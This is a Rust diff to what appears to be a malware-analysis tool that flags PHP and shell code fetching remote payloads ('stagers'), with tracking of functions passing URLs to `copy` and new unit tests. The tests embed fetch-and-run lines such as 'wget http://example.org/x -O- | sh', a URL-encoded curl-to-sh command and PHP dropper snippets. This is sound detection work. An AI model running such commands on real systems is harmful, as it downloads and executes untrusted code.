@@ -90,6 +90,13 @@ static PHP_FETCH_RUN: LazyLock<Regex> = LazyLock::new(|| {
 /// The variable `copy` reads.
 static PHP_COPY_VAR: LazyLock<Regex> =
     LazyLock::new(|| regex(&format!(r"(?i-u){FUNCTION}copy\s*\(\s*\$([A-Za-z0-9_]+)")));
+/// A function's name and parameter list, and a variable in that list.
+static PHP_PARAMS: LazyLock<Regex> = LazyLock::new(|| {
+    regex(&format!(
+        r"(?i-u){FUNCTION}function\s+&?\s*([A-Za-z0-9_]+)\s*\(([^)]*)\)"
+    ))
+});
+static PHP_VARIABLE: LazyLock<Regex> = LazyLock::new(|| regex(r"(?-u)\$([A-Za-z0-9_]+)"));
 /// A PHP-CGI option PHP loads and runs the file of.
 static PHP_CGI_LOAD: LazyLock<Regex> =
     LazyLock::new(|| regex(r"(?-u)(?:auto_prepend_file|auto_append_file)[ \t]*=[ \t]*"));
@@ -830,6 +837,40 @@ fn php_fetches(text: &[u8]) -> bool {
     })
 }
 
+/// The functions whose parameter `copy` reads, by lowercase name and the
+/// parameter's place. `copy` fetches and writes in one call, for what that
+/// parameter is given and nothing else the function takes.
+fn copying_parameters(text: &[u8], copied: &HashSet<&[u8]>) -> HashSet<(Vec<u8>, usize)> {
+    let mut found = HashSet::new();
+    for c in PHP_PARAMS.captures_iter(text) {
+        for (place, param) in c[2].split(|&b| b == b',').enumerate() {
+            let read = PHP_VARIABLE.captures(param);
+            if read.is_some_and(|v| copied.contains(&v[1])) {
+                found.insert((c[1].to_ascii_lowercase(), place));
+            }
+        }
+    }
+    found
+}
+
+/// The call the argument starting at `quote` is in, by lowercase name, and
+/// its place there. Looked for at most [`MAX_STATEMENT`] back, and not past
+/// the statement.
+fn call_of(text: &[u8], quote: usize) -> Option<(Vec<u8>, usize)> {
+    let (mut depth, mut place) = (0usize, 0usize);
+    for at in (quote.saturating_sub(MAX_STATEMENT)..quote).rev() {
+        match text[at] {
+            b')' | b']' => depth += 1,
+            b'(' | b'[' if depth > 0 => depth -= 1,
+            b'(' => return Some((name_before(text, at).0.to_ascii_lowercase(), place)),
+            b'[' | b';' | b'{' | b'}' => return None,
+            b',' if depth == 0 => place += 1,
+            _ => {}
+        }
+    }
+    None
+}
+
 /// Whether the layer hands the variable or constant `name` to a fetch.
 fn fetched_by_name(text: &[u8], name: &[u8]) -> bool {
     if name.is_empty() {
@@ -939,17 +980,20 @@ impl Urls<'_> {
     /// A URL in PHP text that the script keeps: a whole string, handed to
     /// `include` or `copy`, or, in a layer that both fetches and writes or
     /// runs what it fetches, an argument or a variable's value. Such a
-    /// script often takes the URL as an argument of its own function, so
-    /// the layer is read, not one call. Text it only shows joins nothing, as
+    /// script often takes the URL as an argument of its own function, so the
+    /// layer is read, not one call. The one exception is an argument for a
+    /// parameter `copy` reads, which is that one call: `copy` alone says
+    /// nothing about the rest of the layer. Text it only shows joins nothing, as
     /// a shared script's credit link would tie all its users together.
     fn php_saved(&self, xray: &Xray, layer: usize, found: &mut Found) {
         let text = &xray.layers[layer].text;
-        let keeps = PHP_FETCH_RUN.is_match(text) || (php_fetches(text) && PHP_WRITE.is_match(text));
         let copied: HashSet<&[u8]> = PHP_COPY_VAR
             .captures_iter(text)
             .filter_map(|c| c.get(1))
             .map(|m| m.as_bytes())
             .collect();
+        let keeps = PHP_FETCH_RUN.is_match(text) || (php_fetches(text) && PHP_WRITE.is_match(text));
+        let copying = copying_parameters(text, &copied);
         for (start, end) in php_literals(text) {
             let Some((0, len, url)) = urls_in(&text[start..end]).next() else {
                 continue;
@@ -961,7 +1005,7 @@ impl Urls<'_> {
                 Literal::Kept => true,
                 Literal::Argument => match defined_name(text, start) {
                     Some(name) => keeps && fetched_by_name(text, name),
-                    None => keeps,
+                    None => keeps || call_of(text, start - 1).is_some_and(|c| copying.contains(&c)),
                 },
                 // A literal only assigned is a fetch's when the fetch uses it.
                 Literal::Assigned(name) => {
@@ -981,7 +1025,7 @@ impl Urls<'_> {
         for (child, l) in xray.layers.iter().enumerate() {
             let decoded = matches!(
                 l.kind,
-                LayerKind::Base64 | LayerKind::Gzip | LayerKind::Hex | LayerKind::Escapes
+                LayerKind::Base64 | LayerKind::Compressed | LayerKind::Hex | LayerKind::Escapes
             );
             if !decoded || l.parent != Some(layer) {
                 continue;
@@ -1480,6 +1524,32 @@ mod tests {
     fn copy_of_another_file_keeps_nothing() {
         let x = post("<?php $u = 'http://example.org/s'; copy($a, $b); ?>");
         assert_eq!(one(&x, PieceKind::Stager).role, Role::Queried);
+        let x = post("<?php drop('http://example.org/s'); copy($a, $b); ?>");
+        assert_eq!(one(&x, PieceKind::Stager).role, Role::Queried);
+    }
+
+    /// `copy` says nothing about what else the function, or the layer, takes.
+    #[test]
+    fn a_credit_beside_a_copying_function_is_not_a_stager() {
+        for php in [
+            "function cp($src, $label) { copy($src, 'a'); } cp($f, 'https://example.org/');",
+            "function cp($src, $to) { copy($src, $to); } credit('https://example.org/');",
+            "function cp($src, $to) { copy($src, $to); } $a = array('x' => 'https://example.org/');",
+        ] {
+            let x = post(&format!("<?php {php} ?>"));
+            assert_eq!(one(&x, PieceKind::Stager).role, Role::Queried, "{php}");
+        }
+    }
+
+    #[test]
+    fn copy_of_a_function_parameter_keeps_its_argument() {
+        for php in [
+            "function drop($url, $to) { copy($url, $to); } drop('http://example.org/s', 'a');",
+            "function drop($a, $url = 'x') { copy($url, 'a'); } drop(1, 'http://example.org/s');",
+        ] {
+            let x = post(&format!("<?php {php} ?>"));
+            assert_eq!(one(&x, PieceKind::Stager).role, Role::Stager, "{php}");
+        }
     }
 
     #[test]
@@ -1528,6 +1598,32 @@ mod tests {
             assert_eq!(x.layers.len(), 1, "{path}");
             assert_eq!(x.pieces, [], "{path}");
         }
+    }
+
+    /// A key with no `END` is masked to the end of the text: what follows it
+    /// is lost, and none of it is shown.
+    #[test]
+    fn a_fetch_behind_a_key_is_read_only_past_its_end() {
+        let key = "-----BEGIN RSA PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAA\n";
+        let fetch = "wget http://example.org/x -O- | sh\n";
+        let x = post(&format!("{key}-----END RSA PRIVATE KEY-----\n{fetch}"));
+        assert_eq!(role_of(&x, "example.org"), Role::Stager);
+        let x = post(&format!("{key}{fetch}"));
+        assert_eq!(of(&x, PieceKind::Stager), Vec::<&Piece>::new());
+        for p in &x.pieces {
+            assert!(!format!("{p:?}").contains("b3Blbn"), "{p:?}");
+        }
+    }
+
+    /// The field that opens the text comes first, and is read first: the
+    /// other field holds the text and is read after it.
+    #[test]
+    fn a_fetch_open_as_a_later_field_is_saved_by_what_runs_it() {
+        let x = post(
+            "a=sh+-c+%22%24%28curl+-s+http%3A%2F%2Fexample.org%2Fx%29%22\
+             &b=curl+-s+http%3A%2F%2Fexample.org%2Fx",
+        );
+        assert_eq!(role_of(&x, "example.org"), Role::Stager);
     }
 
     #[test]
